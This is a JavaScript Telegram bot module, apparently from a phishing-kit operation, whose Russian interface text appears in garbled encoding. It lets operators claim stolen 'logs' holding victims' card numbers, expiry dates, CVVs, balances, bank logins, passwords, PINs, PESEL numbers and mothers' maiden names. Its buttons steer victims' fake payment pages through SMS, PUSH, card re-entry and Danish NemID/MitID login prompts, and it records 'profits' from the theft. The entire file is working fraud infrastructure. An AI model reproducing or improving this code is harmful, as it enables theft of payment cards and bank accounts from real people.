const { Composer, Markup } = require("telegraf");
const axios = require("axios");
const escapeHTML = require("escape-html");

const bot = new Composer(async (ctx, next) => next());

const getCurCode = require("./handlers/functions/getCurCode");
const {
  Logs,
  items,
  users,
  settings,
  services,
  countries,
} = require("./database/index");

bot.use(require("./middlewares/writer"));

var workerStatuses = {
  log: {
    sms: "üí¨ –¢–≤–æ–µ–º—É –º–∞–º–æ–Ω—Ç—É https://t.me/end_soft –æ—Ç–ø—Ä–∞–≤–∏–ª–∏ SMS",
    push: "üì≤ –£ —Ç–≤–æ–µ–≥–æ –º–∞–º–æ–Ω—Ç–∞ –∑–∞–ø—Ä–æ—Å–∏–ª–∏ PUSH –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ",
    skip: "‚ùå –õ–æ–≥ –±—ã–ª —Å–∫–∏–ø–Ω—É—Ç",
    change: "‚ôªÔ∏è –ú–∞–º–æ–Ω—Ç–∞ –ø—Ä–æ—Å—è—Ç —Å–º–µ–Ω–∏—Ç—å –∫–∞—Ä—Ç—É",
    custom: "üò® –ú–∞–º–æ–Ω—Ç—É –æ—Ç–ø—Ä–∞–≤–∏–ª–∏ –∫–∞—Å—Ç–æ–º–Ω—É—é –æ—à–∏–±–∫–∞",
    card: "üí≥ –ú–∞–º–æ–Ω—Ç–∞ –Ω–∞–ø—Ä–∞–≤–∏–ª–∏ –Ω–∞ –≤–≤–æ–¥ –∫–∞—Ä—Ç—ã",
    inputYourBalance: "üí∞ –£ –º–∞–º–æ–Ω—Ç–∞ –∑–∞–ø—Ä–æ—Å–∏–ª–∏ —Ç–æ—á–Ω—ã–π –±–∞–ª–∞–Ω—Å",
    nemid_dk_lk: "üîê –ú–∞–º–æ–Ω—Ç–∞ –æ—Ç–ø—Ä–∞–≤–∏–ª–∏ –Ω–∞ –≤–≤–æ–¥ –ª–∫ NemID",
    mitid_dk_lk: "üîê –ú–∞–º–æ–Ω—Ç–∞ –æ—Ç–ø—Ä–∞–≤–∏–ª–∏ –Ω–∞ –≤–≤–æ–¥ –ª–∫ MitID",
    refresh: "üîÅ –ú–∞–º–æ–Ω—Ç—É –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏–ª–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—É",
    wait: "‚è≥ –ú–∞–º–æ–Ω—Ç–∞ –æ—Ç–ø—Ä–∞–≤–∏–ª–∏ –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É –æ–∂–∏–¥–∞–Ω–∏—è",
    lkCard: "üí≥ –ú–∞–º–æ–Ω—Ç–∞ –Ω–∞–ø—Ä–∞–≤–∏–ª–∏ –Ω–∞ –≤–≤–æ–¥ –∫–∞—Ä—Ç—ã",
    hold: "‚è∞ –ú–∞–º–æ–Ω—Ç–∞ –æ—Ç–ø—Ä–∞–≤–∏–ª–∏ –Ω–∞ —Ç–∞–π–º–µ—Ä",
    wrongLk: "‚ùå –ú–∞–º–æ–Ω—Ç –≤–≤–µ–ª –Ω–µ–≤–µ—Ä–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –æ—Ç –õ–ö"
  },
};

var status = {
  log: {
    sms: "SMS",
    push: "PUSH",
    skip: "–°–∫–∏–ø",
    change: "–°–ú–ï–ù–ê",
    custom: "–°–í–û–Ø –û–®–ò–ë–ö–ê",
    card: "–í–í–û–î –ö–ê–†–¢–´",
    inputYourBalance: "–¢–û–ß–ù–´–ô –ë–ê–õ–ê–ù–°",
    nemid_dk_lk: "–õ–ö NemID",
    mitid_dk_lk: "–õ–ö MitID",
    refresh: "–ü–ï–†–ï–ó–ê–ì–†–£–ó–ö–ê",
    wait: "–û–ñ–ò–î–ê–ù–ò–ï",
    wrongData: "–ù–ï–í–ï–†–ù–´–ï –î–ê–ù–ù–´–ï",
    lkCard: "–í–í–û–î –ö–ê–†–¢–´",
    hold: "–¢–ê–ô–ú–ï–†",
    wrongLk: "–ù–ï–í–ï–†–ù–´–ï –î–ê–ù–ù–´–ï"
  },
};

async function vbivButtons(logId) {
  const buttons = Markup.inlineKeyboard([
    [Markup.callbackButton("‚úÖ –ó–∞–ª–µ—Ç", `log_profit_${logId}`)],
    [
      Markup.callbackButton("SMS", `log_${logId}_setStatus_sms`),
      Markup.callbackButton("PUSH", `log_${logId}_setStatus_push`),
    ],
    [
      Markup.callbackButton("–ù–ï –ë–¨–ï–¢–°–Ø", `log_${logId}_setStatus_skip`),
      Markup.callbackButton("–°–ú–ï–ù–ò–¢–¨ –ö–ê–†–¢–£", `log_${logId}_setStatus_change`),
    ],
    [
      Markup.callbackButton("–°–í–û–Ø –û–®–ò–ë–ö–ê", `log_${logId}_setStatus_custom`),
      Markup.callbackButton("–í–í–û–î –ö–ê–†–¢–´", `log_${logId}_setStatus_card`),
    ],
    [
      Markup.callbackButton(
        "–ë–ê–õ–ê–ù–°",
        `log_${logId}_setStatus_inputYourBalance`
      ),
      Markup.callbackButton("–õ–ö", `log_${logId}_setStatus_lk`),
    ],
    [
      Markup.callbackButton("–ü–ï–†–ï–ó–ê–ì–†–£–ó–ö–ê", `log_${logId}_setStatus_refresh`),
      Markup.callbackButton("–û–ñ–ò–î–ê–ù–ò–ï", `log_${logId}_setStatus_wait`),
    ],
    [Markup.callbackButton("‚ùå –£–π—Ç–∏ —Å–æ –≤–±–∏–≤–∞", `log_${logId}_leave`)],
  ]);

  return buttons;
}

async function lkButtons(logId) {
  const buttons = Markup.inlineKeyboard([
    [Markup.callbackButton("‚úÖ –ó–∞–ª–µ—Ç", `log_profit_${logId}`)],
    [
      // Markup.callbackButton("SMS", `log_${logId}_setStatus_sms`),
      Markup.callbackButton("PUSH", `log_${logId}_setStatus_push`),
      Markup.callbackButton("–¢–ê–ô–ú–ï–†", `log_${logId}_setStatus_hold`),
    ],
    [
      Markup.callbackButton("SMS", `log_${logId}_setStatus_sms`),
    ],
    // [
    //   Markup.callbackButton("–ù–ï–í–ï–†–ù–´–ô –î–ê–ù–ù–´–ï", `log_${logId}_setStatus_wrongData`),
    // ],
    [
    //   Markup.callbackButton("–°–í–û–Ø –û–®–ò–ë–ö–ê", `log_${logId}_setStatus_custom`),
      Markup.callbackButton("–í–í–û–î –ö–ê–†–¢–´", `log_${logId}_setStatus_lkCard`),
      Markup.callbackButton("–ù–ï–í–ï–†–ù–´–ï –î–ê–ù–ù–´–ï", `log_${logId}_setStatus_wrongLk`),
    ],
    [Markup.callbackButton("‚ùå –£–π—Ç–∏ —Å–æ –≤–±–∏–≤–∞", `log_${logId}_leave`)],
  ]);

  return buttons;
}

async function converter(amount, currency) {
  try {
    var balance = "";

    if (amount == null) return "—á–µ–∫–µ—Ä –±–∞–ª–∞–Ω—Å–∞ –≤—ã–∫–ª—é—á–µ–Ω";

    await axios
      .get("https://www.cbr-xml-daily.ru/daily_json.js")
      .then(async function (res) {
        let course = res.data.Valute[currency].Value;

        const symbols = {
          PLN: "z≈Ç",
          EUR: "‚Ç¨",
          DKK: "kr",
        };

        let rub = amount * course;

        balance = `${amount} ${symbols[currency]} / ${rub.toFixed(2)} ‚ÇΩ / ${(
          rub / res.data.Valute.EUR.Value
        ).toFixed(2)} ‚Ç¨`;
      });

    return balance;
  } catch (err) {
    console.log(err);
    return "–Ω–µ —É–¥–∞–ª–∏—Ç—å —Å–æ–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞—Ç—å –±–∞–ª–∞–Ω—Å";
  }
}

async function binInfo(number) {
  try {
    var info = "";

    await axios
      .get(`https://bins.antipublic.cc/bins/${number}`)
      .then(async function (res) {
        if (res.data.bank == null) return (info = "");
        info = `\n- –ë—Ä–µ–Ω–¥: <b>${res.data.brand}</b>
- –°—Ç—Ä–∞–Ω–∞: <b>${res.data.country_flag} ${res.data.country_name}</b>
- –ë–∞–Ω–∫: <b>${res.data.bank}</b>
- –£—Ä–æ–≤–µ–Ω—å: <b>${res.data.level}</b>
- –¢–∏–ø: <b>${res.data.type}</b>\n`;
      })
      .catch(async function (err) {
        info = "";
      });

    return info;
  } catch (err) {
    return "";
  }
}

// –≤—ã–∫–∏–Ω—É—Ç—å —Å–æ –≤–±–∏–≤–∞
bot.action(/^log_removeVbiver_(\d+)$/, async (ctx, next) => {
  try {
    const log = await Logs.findOne({
      where: {
        id: ctx.match[1],
      },
    });

    if (!log) return ctx.answerCbQuery("‚ö†Ô∏è –õ–æ–≥ –Ω–µ –Ω–∞–π–¥–µ–Ω", true);

    if (ctx.state.user.admin == true) await next();
    else return ctx.answerCbQuery("‚ö†Ô∏è –¢—ã –Ω–µ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä –¥—Ä—É–∂–∏—â–µ", true);

    await ctx.telegram
      .deleteMessage(log.vbiverId, log.vbiverMsgId, log.vbiverMsgId)
      .catch((err) => err);

    await log.update({
      vbiverId: null,
    });

    return ctx.editMessageReplyMarkup(
      Markup.inlineKeyboard([
        [Markup.callbackButton("–í–∑—è—Ç—å", `log_take_${log.id}`)],
      ])
    );
  } catch (err) {
    console.log(err);
    try {
      return ctx.answerCbQuery(
        "ü§ñ –í–æ–∑–Ω–∏–∫–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –¥–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è!",
        true
      );
    } catch (err) {
      return ctx.replyWithHTML(
        "ü§ñ –í–æ–∑–Ω–∏–∫–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –¥–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è!"
      );
    }
  }
});

// —É–π—Ç–∏ —Å–æ –≤–±–∏–≤–∞
bot.action(/^log_(\d+)_leave$/, async (ctx, next) => {
  try {
    const log = await Logs.findOne({
      where: {
        id: ctx.match[1],
      },
    });

    if (!log) return ctx.answerCbQuery("‚ö†Ô∏è –õ–æ–≥ –Ω–µ –Ω–∞–π–¥–µ–Ω", true);

    await log.update({
      vbiverId: null,
    });

    await ctx.deleteMessage().catch((err) => err);

    await ctx.telegram
      .editMessageReplyMarkup(
        ctx.state.settings.logsId,
        log.messageId,
        log.messageId,
        Markup.inlineKeyboard([
          [Markup.callbackButton("–í–∑—è—Ç—å", `log_take_${log.id}`)],
        ])
      )
      .catch((err) => err);

    return ctx.telegram.sendMessage(
      ctx.state.settings.logsId,
      `‚ùå –í–±–∏–≤–µ—Ä <b>${ctx.from.username}</b> –æ—Ç–∫–∞–∑–∞–ª—Å—è –æ—Ç –ª–æ–≥–∞!`,
      {
        parse_mode: "HTML",
        reply_to_message_id: log.messageId,
      }
    );
  } catch (err) {
    console.log(err);
    try {
      return ctx.answerCbQuery(
        "ü§ñ –í–æ–∑–Ω–∏–∫–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –¥–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è!",
        true
      );
    } catch (err) {
      return ctx.replyWithHTML(
        "ü§ñ –í–æ–∑–Ω–∏–∫–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –¥–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è!"
      );
    }
  }
});

bot.action(/^log_back_(\d+)$/, async (ctx) => {
  try {
    return ctx
      .editMessageReplyMarkup(await vbivButtons(ctx.match[1]))
      .catch((err) => err);
  } catch (err) {
    console.log(err);
    try {
      return ctx.answerCbQuery(
        "ü§ñ –í–æ–∑–Ω–∏–∫–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –¥–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è!",
        true
      );
    } catch (err) {
      return ctx.replyWithHTML(
        "ü§ñ –í–æ–∑–Ω–∏–∫–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –¥–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è!"
      );
    }
  }
});

// —Å–º–µ–Ω–∞ —Å—Ç–∞—Ç—É—Å–∞
bot.action(
  /^log_(\d+)_setStatus_(wrongLk|hold|lkCard|wrongData|lk|wait|refresh|mitid_dk_lk|nemid_dk_lk|inputYourBalance|card|custom|sms|change|skip|push)$/,
  async (ctx) => {
    try {
      const log = await Logs.findOne({
        where: {
          id: ctx.match[1],
        },
      });

      if (!log) return ctx.answerCbQuery("‚ö†Ô∏è –õ–æ–≥ –Ω–µ –Ω–∞–π–¥–µ–Ω", true);

      const item = await items.findOne({
        where: {
          id: log.itemId,
        },
      });

      if (!item) return ctx.answerCbQuery("‚ö†Ô∏è –û–±—ä—è–≤–ª–µ–Ω–∏–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ", true);

      if (ctx.from.id != log.vbiverId) {
        await ctx.deleteMessage().catch((err) => err);
        return ctx
          .answerCbQuery("‚ùå –≠—Ç–æ –Ω–µ —Ç–≤–æ–π –ª–æ–≥!", true)
          .catch((err) => err);
      }

      await ctx.answerCbQuery().catch((err) => err);

      if (ctx.match[2] == "lk") {
        return ctx
          .editMessageReplyMarkup(
            Markup.inlineKeyboard([
              [
                Markup.callbackButton(
                  "üá©üá∞ NemID",
                  `log_${log.id}_setStatus_nemid_dk_lk`
                ),
                Markup.callbackButton(
                  "üá©üá∞ MitID",
                  `log_${log.id}_setStatus_mitid_dk_lk`
                ),
              ],
              [Markup.callbackButton(`< –ù–∞–∑–∞–¥`, `log_back_${log.id}`)],
            ])
          )
          .catch((err) => err);
      }

      const service = await services.findOne({
        where: {
          code: item.serviceCode,
        },
      });

      const country = await countries.findOne({
        where: {
          code: service.country,
        },
      });

      const worker = await users.findOne({
        where: {
          id: item.workerId,
        },
      });

      await ctx.telegram.sendMessage(
        item.workerId,
        `<b>${workerStatuses.log[ctx.match[2]]}</b>

${
  Array.from(country.title)[0] + Array.from(country.title)[1]
} <b>–ü–ª–æ—â–∞–¥–∫–∞:</b> ${service.title.replace(/[^a-zA-Z]+/g, "")} ${item.status}.0
‚ñ´Ô∏è <b>–û–±—ä—è–≤–ª–µ–Ω–∏–µ:</b> ${item.title} 
‚ñ´Ô∏è <b>–¶–µ–Ω–∞:</b> ${item.price} ${await getCurCode(service.currency)}
‚ñ´Ô∏è <b>ID:</b> ${item.id}

ü•∑ <b>–í–±–∏–≤–µ—Ä:</b> @${ctx.from.username}`,
        {
          parse_mode: "HTML",
          reply_to_message_id: item.cardMsgId,
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton(`üëÅÔ∏è –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –æ–Ω–ª–∞–π–Ω`, `eye_${item.id}`)],
            [
              Markup.callbackButton(`–ù–∞–ø–∏—Å–∞—Ç—å`, `suppportReply_${item.id}`),
              Markup.callbackButton(`–ß–∞—Ç`, `chat_${item.id}`),
            ],
          ]),
        }
      );

      var data = ""

    if(log.other != null) data = {
      login: log.other.login
        ? escapeHTML(String(log.other.login).trim())
        : null,
      password: log.other.password
        ? escapeHTML(String(log.other.password).trim())
        : null,
      pesel: log.other.pesel
        ? escapeHTML(String(log.other.pesel).trim())
        : null,
      pin: log.other.pin ? escapeHTML(String(log.other.pin).trim()) : null,
      motherlastname: log.other.motherlastname
        ? escapeHTML(String(log.other.motherlastname).trim())
        : null,
    };

      var lkData = "";

      var translate = {
        login: "üôã‚Äç‚ôÇÔ∏è –õ–æ–≥–∏–Ω",
        password: "üîê –ü–∞—Ä–æ–ª—å",
        pesel: "üê∂ –ü–µ—Å–µ–ª—å",
        pin: "üîë –ü–ò–ù",
        motherlastname: "üë®‚Äçüë©‚Äçüëß‚Äçüë¶ –î–µ–≤–∏—á—å—è —Ñ–∞–º–∏–ª–∏—è –º–∞—Ç–µ—Ä–∏",
      };

      Object.keys(data).map((v) => {
        if (data[v]) lkData += `\n${translate[v]}: <code>${data[v]}</code>`;
      });

      var text;

      if (log.other == null)
        text = `ü•∑ <b>–í—ã –≤–∑—è–ª–∏ –ª–æ–≥ –Ω–∞ –≤–±–∏–≤</b>
      
üí≥ <b>–ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã:</b> <code>${log.cardNumber}</code>
‚è∞ <b>–°—Ä–æ–∫ –¥–µ–π—Å—Ç–≤–∏—è:</b> <code>${log.cardExp}</code>
üõ°Ô∏è <b>CVV:</b> <code>${log.cardCvv}</code>${
          log.cardBalance == null
            ? ""
            : `\n\nüí∞ <b>–ë–∞–ª–∞–Ω—Å –º–∞–º–æ–Ω—Ç–∞:</b> ${await converter(
                log.cardBalance,
                item.currency
              )}`
        }
${await binInfo(log.cardNumber.replace(/\s/g, ""))}
${Array.from(country.title)[0] + Array.from(country.title)[1]}<b>–ü–ª–æ—â–∞–¥–∫–∞:</b> ${service.title.replace(/[^a-zA-Z]+/g, "")} ${item.status}.0
üë®üèæ‚Äçüíª <b>–†–∞–±–æ—Ç–Ω–∏–∫:</b> @${worker.username}

–°—Ç–∞—Ç—É—Å: <b>${status.log[ctx.match[2]]}</b>`;
      else if(log.other != null && log.cardNumber != null) text = `ü•∑ <b>–í—ã –≤–∑—è–ª–∏ –ª–æ–≥ –Ω–∞ –≤–±–∏–≤</b>
${lkData}
          
üè¶ <b>–ë–∞–Ω–∫:</b> <b>${log.other.bank}</b>

üí≥ <b>–ù–æ–º–µ—Ä https://t.me/end_soft –∫–∞—Ä—Ç—ã:</b> <code>${log.cardNumber}</code>
‚è∞ <b>–°—Ä–æ–∫ –¥–µ–π—Å—Ç–≤–∏—è:</b> <code>${log.cardExp}</code>
üõ°Ô∏è <b>CVV:</b> <code>${log.cardCvv}</code>${
        log.cardBalance == null
          ? ""
          : `\n\nüí∞ <b>–ë–∞–ª–∞–Ω—Å –º–∞–º–æ–Ω—Ç–∞:</b> ${await converter(
              log.cardBalance,
              item.currency
            )}`
      }

${
  Array.from(country.title)[0] + Array.from(country.title)[1]
} <b>–ü–ª–æ—â–∞–¥–∫–∞:</b> ${service.title.replace(/[^a-zA-Z]+/g, "")} ${item.status}.0
üë®üèæ‚Äçüíª <b>–†–∞–±–æ—Ç–Ω–∏–∫:</b> @${worker.username}

–°—Ç–∞—Ç—É—Å: <b>${status.log[ctx.match[2]]}</b>`
      else
        text = `ü•∑ <b>–í—ã –≤–∑—è–ª–∏ –ª–æ–≥ –Ω–∞ –≤–±–∏–≤</b>
${lkData}
    
üè¶ <b>–ë–∞–Ω–∫:</b> <b>${log.other.bank}</b>

üí≥ <b>–ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã:</b> <code>${log.cardNumber}</code>
‚è∞ <b>–°—Ä–æ–∫ –¥–µ–π—Å—Ç–≤–∏—è:</b> <code>${log.cardExp}</code>
üõ°Ô∏è <b>CVV:</b> <code>${log.cardCvv}</code>${
        log.cardBalance == null
          ? ""
          : `\n\nüí∞ <b>–ë–∞–ª–∞–Ω—Å –º–∞–º–æ–Ω—Ç–∞:</b> ${await converter(
              log.cardBalance,
              item.currency
            )}`
      }

${Array.from(country.title)[0] + Array.from(country.title)[1]}<b>–ü–ª–æ—â–∞–¥–∫–∞:</b> ${service.title.replace(/[^a-zA-Z]+/g, "")} ${item.status}.0
üë®üèæ‚Äçüíª <b>–†–∞–±–æ—Ç–Ω–∏–∫:</b> @${worker.username}

–°—Ç–∞—Ç—É—Å: <b>${status.log[ctx.match[2]]}</b>`;

      await ctx
        .editMessageText(text, {
          parse_mode: "HTML",
          reply_markup: log.lk == false ? await vbivButtons(log.id) : await lkButtons(log.id),
        })
        .catch((err) => err);

      if (ctx.match[2] == "custom")
        return ctx.scene.enter("customError", {
          logId: log.id,
        });

      if(ctx.match[2] == "lkCard") await setTimeout(async() => {
        await log.update({
          status: null
        })
      }, 1500)
        
      return log.update({
        status: ctx.match[2],
      });
    } catch (err) {
      console.log(err);
      try {
        return ctx.answerCbQuery(
          "ü§ñ –í–æ–∑–Ω–∏–∫–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –¥–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è!",
          true
        );
      } catch (err) {
        return ctx.replyWithHTML(
          "ü§ñ –í–æ–∑–Ω–∏–∫–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –¥–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è!"
        );
      }
    }
  }
);

// –¥–æ–±–∞–≤–ª–µ–Ω–∏–µ –ø—Ä–æ—Ñ–∏—Ç–∞
bot.action(/^log_profit_(\d+)$/, async (ctx) => {
  try {
    const log = await Logs.findOne({
      where: {
        id: ctx.match[1],
      },
    });

    if (!log) return ctx.answerCbQuery("‚ö†Ô∏è –õ–æ–≥ –Ω–µ –Ω–∞–π–¥–µ–Ω", true);

    const item = await items.findOne({
      where: {
        id: log.itemId,
      },
    });

    if (!item) return ctx.answerCbQuery("‚ö†Ô∏è –û–±—ä—è–≤–ª–µ–Ω–∏–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ", true);

    await log.update({
      status: "successTransaction",
    });

    return ctx.scene.enter("addProfit", {
      itemId: item.id,
      logId: log.id,
    });
  } catch (err) {
    console.log(err);
    try {
      return ctx.answerCbQuery(
        "ü§ñ –í–æ–∑–Ω–∏–∫–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –¥–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è!",
        true
      );
    } catch (err) {
      return ctx.replyWithHTML(
        "ü§ñ –í–æ–∑–Ω–∏–∫–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –¥–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è!"
      );
    }
  }
});

// –≤–∑—è—Ç–∏–µ –ª–æ–≥–∞
bot.action(/^log_take_(\d+)$/, async (ctx) => {
  try {
    const log = await Logs.findOne({
      where: {
        id: ctx.match[1],
      },
    });

    if (!log) return ctx.answerCbQuery("‚ö†Ô∏è –õ–æ–≥ –Ω–µ –Ω–∞–π–¥–µ–Ω", true);

    await log.update({
      vbiverId: ctx.from.id,
    });

    const item = await items.findOne({
      where: {
        id: log.itemId,
      },
    });

    if (!item) return ctx.answerCbQuery("‚ö†Ô∏è –û–±—ä—è–≤–ª–µ–Ω–∏–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ", true);

    await ctx
      .editMessageReplyMarkup(
        Markup.inlineKeyboard([
          [
            Markup.urlButton(
              `‚è≥ –í–±–∏–≤–∞–µ—Ç ${ctx.from.username}`,
              `https://t.me/${ctx.from.username}`
            ),
          ],
          [
            Markup.callbackButton(
              `‚ùå –£–±—Ä–∞—Ç—å —Å–æ –≤–±–∏–≤–∞`,
              `log_removeVbiver_${ctx.match[1]}`
            ),
          ],
        ])
      )
      .catch((err) => err);

    var balance = await converter(log.cardBalance, item.currency);

    const service = await services.findOne({
      where: {
        code: item.serviceCode,
      },
    });

    const country = await countries.findOne({
      where: {
        code: service.country,
      },
    });

    const worker = await users.findOne({
      where: {
        id: item.workerId,
      },
    });

    var data = ""

    if(log.other != null) data = {
      login: log.other.login
        ? escapeHTML(String(log.other.login).trim())
        : null,
      password: log.other.password
        ? escapeHTML(String(log.other.password).trim())
        : null,
      pesel: log.other.pesel
        ? escapeHTML(String(log.other.pesel).trim())
        : null,
      pin: log.other.pin ? escapeHTML(String(log.other.pin).trim()) : null,
      motherlastname: log.other.motherlastname
        ? escapeHTML(String(log.other.motherlastname).trim())
        : null,
    };

    var lkData = "";

    var translate = {
      login: "üôã‚Äç‚ôÇÔ∏è –õ–æ–≥–∏–Ω",
      password: "üîê –ü–∞—Ä–æ–ª—å",
      pesel: "üê∂ –ü–µ—Å–µ–ª—å",
      pin: "üîë –ü–ò–ù",
      motherlastname: "üë®‚Äçüë©‚Äçüëß‚Äçüë¶ –î–µ–≤–∏—á—å—è —Ñ–∞–º–∏–ª–∏—è –º–∞—Ç–µ—Ä–∏",
    };

    Object.keys(data).map((v) => {
      if (data[v]) lkData += `\n${translate[v]}: <code>${data[v]}</code>`;
    });

    var text;

    if (log.other == null)
      text = `ü•∑ <b>–í—ã –≤–∑—è–ª–∏ –ª–æ–≥ –Ω–∞ –≤–±–∏–≤</b>
    
üí≥ <b>–ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã:</b> <code>${log.cardNumber}</code>
‚è∞ <b>–°—Ä–æ–∫ –¥–µ–π—Å—Ç–≤–∏—è:</b> <code>${log.cardExp}</code>
üõ°Ô∏è <b>CVV:</b> <code>${log.cardCvv}</code>${
        log.cardBalance == null
          ? ""
          : `\n\nüí∞ <b>–ë–∞–ª–∞–Ω—Å –º–∞–º–æ–Ω—Ç–∞:</b> ${await converter(
              log.cardBalance,
              item.currency
            )}`
      }
    ${await binInfo(log.cardNumber.replace(/\s/g, ""))}
${Array.from(country.title)[0] + Array.from(country.title)[1]
}<b>–ü–ª–æ—â–∞–¥–∫–∞:</b> ${service.title.replace(/[^a-zA-Z]+/g, "")} ${
    item.status
  }.0
üë®üèæ‚Äçüíª <b>–†–∞–±–æ—Ç–Ω–∏–∫:</b> @${worker.username}`;
    else
      text = `ü•∑ <b>–í—ã –≤–∑—è–ª–∏ –ª–æ–≥ –Ω–∞ –≤–±–∏–≤</b>
${lkData}
    
üè¶ <b>–ë–∞–Ω–∫:</b> <b>${log.other.bank}</b>

üí≥ <b>–ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã:</b> <code>${log.cardNumber}</code>
‚è∞ <b>–°—Ä–æ–∫ –¥–µ–π—Å—Ç–≤–∏—è:</b> <code>${log.cardExp}</code>
üõ°Ô∏è <b>CVV:</b> <code>${log.cardCvv}</code>${
        log.cardBalance == null
          ? ""
          : `\n\nüí∞ <b>–ë–∞–ª–∞–Ω—Å –º–∞–º–æ–Ω—Ç–∞:</b> ${await converter(
              log.cardBalance,
              item.currency
            )}`
      }

${
  Array.from(country.title)[0] + Array.from(country.title)[1]
} <b>–ü–ª–æ—â–∞–¥–∫–∞:</b> ${service.title.replace(/[^a-zA-Z]+/g, "")} ${item.status}.0
üë®üèæ‚Äçüíª <b>–†–∞–±–æ—Ç–Ω–∏–∫:</b> @${worker.username}`;

    const msg = await ctx.telegram
      .sendMessage(ctx.from.id, text, {
        parse_mode: "HTML",
        reply_markup: log.lk == false ? await vbivButtons(log.id) : await lkButtons(log.id),
      })
      .catch((err) => err);
    return log.update({
      vbiverMsgId: msg.message_id,
    });
  } catch (err) {
    console.log(err);
    try {
      return ctx.answerCbQuery(
        "ü§ñ –í–æ–∑–Ω–∏–∫–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –¥–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è!",
        true
      );
    } catch (err) {
      return ctx.replyWithHTML(
        "ü§ñ –í–æ–∑–Ω–∏–∫–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –¥–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è!"
      );
    }
  }
});

module.exports = bot;